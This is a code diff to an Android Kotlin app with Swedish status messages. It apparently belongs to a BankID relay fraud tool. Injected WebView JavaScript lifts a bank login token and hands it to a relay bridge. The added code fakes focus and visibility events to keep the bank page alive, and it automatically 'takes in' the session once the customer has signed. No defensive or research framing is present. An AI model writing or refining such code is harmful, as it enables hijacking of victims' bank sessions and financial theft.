@@ -52,6 +52,14 @@ class MainActivity : Activity() {
         "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
         "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"
 
+    private val nudge = "(function(){" +
+        "try{window.dispatchEvent(new Event('blur'))}catch(e){}" +
+        "try{window.dispatchEvent(new Event('focus'))}catch(e){}" +
+        "try{document.dispatchEvent(new Event('visibilitychange'))}catch(e){}" +
+        "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}" +
+        "try{document.dispatchEvent(new Event('resume'))}catch(e){}" +
+        "try{document.dispatchEvent(new Event('resume'))}catch(e){}})()"
+
     override fun onCreate(b: Bundle?) {
         super.onCreate(b)
         p = getSharedPreferences("relay", 0)
@@ -63,6 +71,16 @@ class MainActivity : Activity() {
         alive = true
         poll()
         handleIntent(intent)
+    }
+
+    override fun onResume() {
+        super.onResume()
+        try {
+            if (::web.isInitialized) {
+                web.onResume()
+                web.evaluateJavascript(nudge, null)
+            }
+        } catch (t: Throwable) {}
     }
 
     override fun onNewIntent(i: Intent?) {
@@ -263,16 +281,27 @@ class MainActivity : Activity() {
 
     private fun taIn() {
         if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
-        val nu = try { web.url ?: "" } catch (x: Throwable) { "" }
-        if (loginUrl.isNotEmpty() && nu.isNotEmpty() && nu != loginUrl) {
-            bar.text = "sidan har redan gatt vidare - ingen omladdning"
-            return
-        }
-        bankUrl = bankField.text.toString().trim()
-        p.edit().putString("bank", bankUrl).apply()
-        loginUrl = ""
-        bar.text = "TAR IN - laddar banken"
-        web.loadUrl(bankUrl)
+        Thread {
+            var i = 0
+            while (i < 4) {
+                i++
+                runOnUiThread {
+                    bar.text = "vacker bankens sida (" + i + "/4)"
+                    try { web.evaluateJavascript(nudge, null) } catch (x: Throwable) {}
+                }
+                try { Thread.sleep(1800) } catch (t: Throwable) {}
+                val nu = try { web.url ?: "" } catch (x: Throwable) { "" }
+                if (loginUrl.isNotEmpty() && nu.isNotEmpty() && nu != loginUrl) {
+                    runOnUiThread { bar.text = "SIDAN GICK VIDARE - du ar inne" }
+                    return@Thread
+                }
+            }
+            runOnUiThread {
+                bar.text = "sidan star still - laddar om"
+                loginUrl = ""
+                web.loadUrl(bankUrl)
+            }
+        }.start()
     }
 
     private fun visaLank(c: String) {
@@ -346,8 +375,10 @@ class MainActivity : Activity() {
                         signerad = true
                         runOnUiThread {
                             inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
-                            bar.text = "KUNDEN HAR SIGNERAT - tryck IN"
+                            bar.text = "KUNDEN HAR SIGNERAT - vacker banken"
                         }
+                        try { Thread.sleep(3000) } catch (t: Throwable) {}
+                        taIn()
                     }
                 } catch (t: Throwable) {}
             }
